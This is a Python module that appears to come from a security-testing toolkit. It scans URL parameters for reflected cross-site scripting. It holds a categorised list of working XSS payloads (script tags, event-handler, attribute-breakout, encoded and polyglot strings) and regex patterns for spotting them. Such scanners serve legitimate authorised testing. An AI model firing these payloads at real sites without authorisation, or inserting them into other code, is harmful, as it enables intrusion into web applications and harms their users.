# janus/attack/xss_scanner.py
"""
Cross-Site Scripting (XSS) Detection Module.

Tests for reflected XSS vulnerabilities by injecting payloads
and checking if they appear unescaped in the response.
"""

import requests
import html
import re
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Any, Optional
from datetime import datetime
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse


@dataclass
class XSSFinding:
    """A single XSS finding."""
    endpoint: str
    parameter: str
    payload: str
    context: str  # html_context, attribute_context, script_context, url_context
    vulnerable: bool
    severity: str
    evidence: str
    recommendation: str
    
    def to_dict(self) -> Dict:
        return asdict(self)


@dataclass
class XSSReport:
    """XSS scan report."""
    target_url: str
    scan_time: str
    vulnerable_params: int
    total_params_tested: int
    findings: List[XSSFinding] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            **asdict(self),
            'findings': [f.to_dict() for f in self.findings]
        }


class XSSScanner:
    """
    Cross-Site Scripting (XSS) Scanner.
    
    Tests for reflected XSS by:
    - Injecting various XSS payloads
    - Checking for unescaped reflection in response
    - Identifying injection context (HTML, attribute, JS)
    
    DISCLAIMER: For authorized security testing only.
    """
    
    # XSS payloads organized by context
    PAYLOADS = {
        'basic': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            '</script><script>alert(1)</script>',
        ],
        'attribute': [
            '" onmouseover="alert(1)',
            "' onmouseover='alert(1)",
            '" onfocus="alert(1)" autofocus="',
            "' onfocus='alert(1)' autofocus='",
            '" onclick="alert(1)"',
        ],
        'javascript': [
            "';alert(1)//",
            '";alert(1)//',
            '</script><script>alert(1)//',
            "'-alert(1)-'",
            '`-alert(1)-`',
        ],
        'event_handlers': [
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<details open ontoggle=alert(1)>',
        ],
        'encoding': [
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
        ],
        'polyglot': [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            "'\"--></style></script><script>alert(1)//",
            "><script>alert(String.fromCharCode(88,83,83))</script>",
        ]
    }
    
    # Unique marker for detection
    MARKER = "jAnUs_XsS_MaRkEr_" 
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
    
    def scan(
        self,
        url: str,
        params: Optional[List[str]] = None,
        token: Optional[str] = None,
        method: str = "GET"
    ) -> XSSReport:
        """
        Scan URL parameters for XSS vulnerabilities.
        
        Args:
            url: Target URL
            params: List of parameter names to test (auto-detected if None)
            token: Optional authorization token
            method: HTTP method
        
        Returns:
            XSSReport with findings
        """
        findings = []
        headers = {'Authorization': token} if token else {}
        
        # Auto-detect parameters
        if params is None:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            params = list(query_params.keys())
        
        for param in params:
            param_findings = self._test_parameter(url, param, headers, method)
            findings.extend(param_findings)
        
        vulnerable_count = len(set(f.parameter for f in findings if f.vulnerable))
        
        return XSSReport(
            target_url=url,
            scan_time=datetime.now().isoformat(),
            vulnerable_params=vulnerable_count,
            total_params_tested=len(params),
            findings=findings
        )
    
    def _test_parameter(
        self,
        url: str,
        param: str,
        headers: Dict,
        method: str
    ) -> List[XSSFinding]:
        """Test a single parameter for XSS."""
        findings = []
        
        # First, test with a unique marker to see if input is reflected
        marker = f"{self.MARKER}{param}"
        test_url = self._inject_payload(url, param, marker)
        
        try:
            if method.upper() == "GET":
                response = requests.get(test_url, headers=headers, timeout=self.timeout)
            else:
                response = requests.post(url, data={param: marker}, headers=headers, timeout=self.timeout)
            
            # Check if marker is reflected
            if marker not in response.text:
                return []  # Parameter not reflected
            
            # Determine context
            context = self._determine_context(response.text, marker)
            
        except Exception:
            return []
        
        # Now test with actual XSS payloads based on context
        payloads_to_test = self._get_payloads_for_context(context)
        
        for payload in payloads_to_test[:5]:  # Limit for speed
            finding = self._test_payload(url, param, payload, headers, method)
            if finding and finding.vulnerable:
                findings.append(finding)
                break  # One successful payload per param is enough
        
        return findings
    
    def _test_payload(
        self,
        url: str,
        param: str,
        payload: str,
        headers: Dict,
        method: str
    ) -> Optional[XSSFinding]:
        """Test a single XSS payload."""
        test_url = self._inject_payload(url, param, payload)
        
        try:
            if method.upper() == "GET":
                response = requests.get(test_url, headers=headers, timeout=self.timeout)
            else:
                response = requests.post(url, data={param: payload}, headers=headers, timeout=self.timeout)
            
            # Check if payload is reflected unescaped
            is_vulnerable, evidence = self._check_reflection(response.text, payload)
            
            if is_vulnerable:
                context = self._determine_context(response.text, payload)
                return XSSFinding(
                    endpoint=url,
                    parameter=param,
                    payload=payload,
                    context=context,
                    vulnerable=True,
                    severity='HIGH',
                    evidence=evidence,
                    recommendation="Implement proper output encoding. Use context-aware escaping (HTML, JS, URL)."
                )
                
        except Exception:
            pass
        
        return None
    
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter."""
        parsed = urlparse(url)
        query_dict = parse_qs(parsed.query)
        query_dict[param] = [payload]
        
        new_query = urlencode(query_dict, doseq=True)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
    
    def _determine_context(self, response_text: str, marker: str) -> str:
        """Determine the context where input is reflected."""
        # Find marker position
        idx = response_text.find(marker)
        if idx == -1:
            return 'unknown'
        
        # Get surrounding context (500 chars before and after)
        start = max(0, idx - 200)
        end = min(len(response_text), idx + len(marker) + 200)
        context = response_text[start:end].lower()
        
        # Check for script context
        if '<script' in context and '</script>' in context:
            return 'script_context'
        
        # Check for attribute context
        if re.search(r'[\'"]\s*' + re.escape(marker[:10].lower()), context):
            return 'attribute_context'
        
        # Check for URL context
        if 'href=' in context or 'src=' in context or 'action=' in context:
            return 'url_context'
        
        # Default to HTML context
        return 'html_context'
    
    def _get_payloads_for_context(self, context: str) -> List[str]:
        """Get payloads optimized for the detected context."""
        if context == 'script_context':
            return self.PAYLOADS['javascript'] + self.PAYLOADS['basic']
        elif context == 'attribute_context':
            return self.PAYLOADS['attribute'] + self.PAYLOADS['event_handlers']
        elif context == 'url_context':
            return ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>'] + self.PAYLOADS['basic']
        else:
            return self.PAYLOADS['basic'] + self.PAYLOADS['polyglot']
    
    def _check_reflection(self, response_text: str, payload: str) -> tuple:
        """Check if XSS payload is reflected unescaped."""
        # Check for exact reflection
        if payload in response_text:
            # Verify it's not escaped
            escaped = html.escape(payload)
            if escaped not in response_text or payload in response_text:
                # Find context for evidence
                idx = response_text.find(payload)
                start = max(0, idx - 30)
                end = min(len(response_text), idx + len(payload) + 30)
                context = response_text[start:end]
                return True, f"Payload reflected unescaped: ...{context}..."
        
        # Check for partial reflection (script tags, event handlers)
        dangerous_patterns = [
            r'<script[^>]*>',
            r'onerror\s*=',
            r'onload\s*=',
            r'onclick\s*=',
            r'onmouseover\s*=',
            r'javascript:',
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                payload_part = payload[:20]
                if payload_part in response_text:
                    return True, f"Dangerous pattern reflected: {pattern}"
        
        return False, ""
    
    def quick_scan(
        self,
        url: str,
        param: str,
        token: Optional[str] = None
    ) -> Dict[str, Any]:
        """Quick scan of a single parameter."""
        report = self.scan(url, [param], token)
        
        return {
            "url": url,
            "parameter": param,
            "vulnerable": report.vulnerable_params > 0,
            "findings": [f.to_dict() for f in report.findings]
        }
